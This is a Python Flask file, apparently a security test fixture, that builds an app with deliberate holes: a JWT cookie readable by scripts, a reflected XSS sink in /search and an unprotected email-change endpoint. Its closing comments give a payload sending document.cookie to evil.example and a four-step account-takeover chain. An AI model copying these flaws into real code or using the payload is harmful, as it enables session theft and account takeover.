# dojolm-token-attacks-1915.py
# JWT-in-cookie not HttpOnly+Secure: XSS reads the access bearer and
# replays it from attacker-controlled origin (HIGH multi-step).
#
# Mechanism: SPA stores its access JWT in document.cookie, but the cookie
# is set without HttpOnly and without Secure. A reflected XSS in the
# /search?q= endpoint (existing CSP allows inline scripts via
# 'unsafe-inline') reads document.cookie and exfiltrates it. The bearer
# is then replayed from any origin because the API does not check Origin
# nor bind the bearer to a session cookie.

import html
import logging
import time
from typing import Optional

import jwt
from flask import Flask, request, make_response, jsonify, g

logger = logging.getLogger("dojolm.web")
app = Flask(__name__)

JWT_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\n<PUBKEY_PLACEHOLDER>\n-----END PUBLIC KEY-----\n"
JWT_ISS = "https://auth.dojolm.example"
JWT_AUD = "dojolm-spa"

# Bearer cookie. Used by the SPA's fetch() calls because the team wanted
# automatic include-credentials without managing localStorage. The cookie
# is created by the /oauth/callback handler.
ACCESS_COOKIE = "dojolm_access"
SESSION_COOKIE = "dojolm_session"


def _verify_bearer(token: str) -> Optional[dict]:
    try:
        return jwt.decode(
            token,
            JWT_PUBKEY_PEM,
            algorithms=["RS256"],
            issuer=JWT_ISS,
            audience=JWT_AUD,
        )
    except jwt.InvalidTokenError as exc:
        logger.warning("verify-fail", extra={"err": str(exc)})
        return None


@app.post("/oauth/callback")
def oauth_callback():
    """
    OAuth callback handler. Exchanges the authorization code for an access
    JWT, then sets it as a cookie. Defect: the cookie is missing HttpOnly
    AND Secure flags. SameSite=Lax is set, but JS in the same origin can
    still read it. The reasoning at the time was "the SPA needs to read
    the JWT to introspect claims for UI gating", which is true — but the
    introspection should be done from a separate non-secret claims cookie
    or from a /api/whoami endpoint, not from the bearer itself.
    """
    code = request.form.get("code", "")
    # ... exchange code with IdP ...
    issued_token = "<TOKEN_PLACEHOLDER>"  # placeholder, real token from IdP

    resp = make_response(jsonify({"ok": True}))
    # Defect: httponly=False, secure=False. The cookie is JS-readable.
    resp.set_cookie(
        ACCESS_COOKIE,
        issued_token,
        max_age=900,
        httponly=False,    # <-- defect
        secure=False,      # <-- defect (also problematic on http during dev)
        samesite="Lax",
        path="/",
    )
    # Session cookie — at least this one is HttpOnly. But the bearer is
    # the high-value secret, not this opaque session pointer.
    resp.set_cookie(
        SESSION_COOKIE,
        "sess_" + issued_token[:8],
        max_age=900,
        httponly=True,
        secure=True,
        samesite="Lax",
        path="/",
    )
    return resp


@app.before_request
def _attach_principal():
    # Two paths to bearer: header OR cookie. Both are accepted equally.
    auth = request.headers.get("Authorization", "")
    token = auth[7:] if auth.startswith("Bearer ") else request.cookies.get(ACCESS_COOKIE, "")
    if not token:
        return
    claims = _verify_bearer(token)
    if claims is not None:
        g.principal = {"sub": claims.get("sub"), "scope": claims.get("scope", "")}


@app.get("/search")
def search():
    """
    Reflected XSS in /search?q=. The query is interpolated into a script
    tag for a "no results" autosuggest hint. CSP is set elsewhere with
    'unsafe-inline' to support legacy widgets.
    """
    q = request.args.get("q", "")
    # Defect: q is interpolated into a script context unescaped.
    body = f"""
    <!doctype html>
    <html>
    <head><title>Search</title></head>
    <body>
      <h1>Search results</h1>
      <p>You searched for: {html.escape(q)}</p>
      <script>
        // Autosuggest seed — interpolated server-side for SEO snapshots.
        var seedQuery = "{q}";  // <-- XSS sink, q is not escaped here
        if (window.__seed_handler) window.__seed_handler(seedQuery);
      </script>
    </body>
    </html>
    """
    resp = make_response(body)
    # CSP allows 'unsafe-inline' for backwards compat with the autosuggest
    # widget, which inlines its handler at runtime.
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://cdn.dojolm.example; "
        "img-src 'self' data: https:; "
        "connect-src 'self' https://api.dojolm.example"
    )
    return resp


@app.get("/api/whoami")
def whoami():
    if not getattr(g, "principal", None):
        return jsonify({"error": "unauthenticated"}), 401
    return jsonify(g.principal)


@app.post("/api/account/email")
def change_email():
    """
    Sensitive operation: change account email. Trusts the bearer's sub.
    No re-auth, no Origin check, no CSRF token. The bearer is the only
    auth surface.
    """
    if not getattr(g, "principal", None):
        return jsonify({"error": "unauthenticated"}), 401
    new_email = request.json.get("new_email") if request.is_json else None
    if not new_email:
        return jsonify({"error": "missing_email"}), 400
    # ... update DB, send confirmation ...
    return jsonify({"ok": True, "sub": g.principal["sub"], "email": new_email})


# Step 1: attacker crafts a search URL with payload:
#   /search?q=";document.location="https://evil.example/x?c="+encodeURIComponent(document.cookie);//
#   The interpolation lands inside a JS string literal, escaping out of
#   the string and exfiltrating document.cookie to the attacker's host.
# Step 2: victim visits the search URL (delivered via phishing or via
#   referer chain from a legitimate page). Their browser executes the
#   injected JS in the dojolm.example origin, reads document.cookie
#   (including dojolm_access because httponly=False), and POSTs it to
#   evil.example.
# Step 3: attacker decodes the cookie value (it is a JWT; aud=dojolm-spa,
#   iss=https://auth.dojolm.example, exp ~ now+15min). Within the 15-min
#   window the attacker calls /api/account/email from any origin; CORS
#   on /api is permissive (Access-Control-Allow-Origin: *), and the
#   bearer is accepted from the Authorization header.
# Step 4: the bearer's sub is the victim. Email change succeeds. The
#   confirmation flow sends to the new email (attacker-controlled),
#   completing account takeover.
#
# Chain remains open: cookie is missing HttpOnly+Secure, CSP allows
# unsafe-inline, /search has reflected XSS sink, bearer is not bound to
# any client property, CORS is permissive on /api.

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
